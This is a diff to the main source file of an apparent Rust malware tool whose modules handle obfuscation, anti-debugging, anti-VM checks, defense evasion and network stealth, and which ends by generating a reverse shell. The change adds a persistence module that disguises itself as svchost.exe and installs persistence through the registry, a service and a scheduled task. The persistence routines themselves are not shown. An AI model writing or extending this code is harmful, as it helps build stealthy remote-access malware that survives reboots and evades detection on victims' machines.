@@ -11,6 +11,7 @@ mod connection_methods;
 mod obfuscation;
 mod defense_evasion;
 mod network_stealth;
+mod persistence;
 
 use encryption::{generate_obfuscated_string, XorKey};
 use connection::{Connection, ConnectionConfig};
@@ -20,6 +21,7 @@ use connection_methods::ConnectionMethod;
 use obfuscation::Obfuscation;
 use defense_evasion::DefenseEvasion;
 use network_stealth::{NetworkStealth, TrafficPattern, Protocol, Encryption as NetworkEncryption, Fragmentation};
+use persistence::Persistence;
 
 #[derive(Parser, Debug)]
 #[command(author, version, about, long_about = None)]
@@ -66,6 +68,7 @@ fn main() -> anyhow::Result<()> {
     let anti_vm = AntiVM::new();
     let defense_evasion = DefenseEvasion::new();
     let network_stealth = NetworkStealth::new();
+    let persistence = Persistence::new("C:\\Windows\\System32\\svchost.exe".to_string());
 
     // Check for debugging
     if anti_debug.detect_debugger() {
@@ -124,6 +127,17 @@ fn main() -> anyhow::Result<()> {
     if !network_stealth.simulate_normal_traffic() {
         println!("Failed to simulate normal traffic!");
         return Ok(());
+    }
+
+    // Add persistence mechanisms
+    if let Err(e) = persistence.add_registry_persistence() {
+        println!("Failed to add registry persistence: {}", e);
+    }
+    if let Err(e) = persistence.add_service_persistence() {
+        println!("Failed to add service persistence: {}", e);
+    }
+    if let Err(e) = persistence.add_scheduled_task() {
+        println!("Failed to add scheduled task: {}", e);
     }
 
     // Generate the reverse shell code
